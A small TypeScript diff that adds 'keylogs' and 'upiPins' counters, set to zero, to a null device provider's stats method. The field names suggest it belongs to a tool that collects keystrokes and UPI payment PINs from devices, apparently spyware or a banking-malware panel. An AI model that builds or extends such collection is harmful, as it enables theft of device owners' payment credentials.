@@ -15,7 +15,7 @@ export class NullProvider implements IDeviceProvider {
     }
 
     async getDeviceStats(_deviceId: string): Promise<DeviceStats> {
-        return { messages: 0, apps: 0 };
+        return { messages: 0, apps: 0, keylogs: 0, upiPins: 0 };
     }
 
     async getMessages(_deviceId: string, _limit: number = 100): Promise<any[]> {
